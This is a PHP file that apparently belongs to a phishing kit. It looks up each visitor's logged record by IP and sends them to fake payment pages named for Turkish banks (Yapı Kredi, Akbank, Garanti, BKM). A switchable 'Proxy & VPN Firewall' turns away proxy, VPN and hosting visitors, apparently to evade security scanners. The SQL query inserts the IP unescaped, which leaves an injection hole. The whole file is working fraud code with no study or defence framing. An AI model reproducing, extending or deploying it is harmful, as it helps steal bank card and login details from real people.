<?php

include_once("config.php");
include_once("./txmd/Data/Server/GrabIP.php");
include_once("./txmd/Data/Server/BlockVPN.php");
include_once("./txmd/Data/Server/BanControl.php");

$check = $pdo->query("SELECT * FROM logs WHERE ip = '{$ip}'")->fetch(PDO::FETCH_ASSOC);
$checkAdmin = $pdo->query("SELECT * FROM admin_settings")->fetch(PDO::FETCH_ASSOC);

if ($checkAdmin["proxy_vpn"] == 1) {
    if ($proxy == 1 or $hosting == 1) {
        die('Proxy & VPN Firewall - txmd');
    }
}

if (str_contains($check['banka'], "YAPI")) {
    if ($_GET['control'] == "error") {
        header('Location: /payment/yapikredi?control=error');
    } else if ($_GET['control'] == "success") {
        header('Location: /payment/yapikredi?control=success');
    } else {
        header('Location: /payment/yapikredi');
    }
} else if (str_contains($check['banka'], "AKBANK")) {
    if ($_GET['control'] == "error") {
        header('Location: /payment/akbank?control=error');
    } else if ($_GET['control'] == "success") {
        header('Location: /payment/akbank?control=success');
    } else {
        header('Location: /payment/akbank');
    }
} else if (str_contains($check['banka'], "GARANTI")) {
    if ($_GET['control'] == "error") {
        header('Location: /payment/garanti?control=error');
    } else if ($_GET['control'] == "success") {
        header('Location: /payment/garanti?control=success');
    } else {
        header('Location: /payment/garanti');
    }
} else {
    if ($_GET['control'] == "error") {
        header('Location: /payment/bkm?control=error');
    } else if ($_GET['control'] == "success") {
        header('Location: /payment/bkm?control=success');
    } else {
        header('Location: /payment/bkm');
    }
}
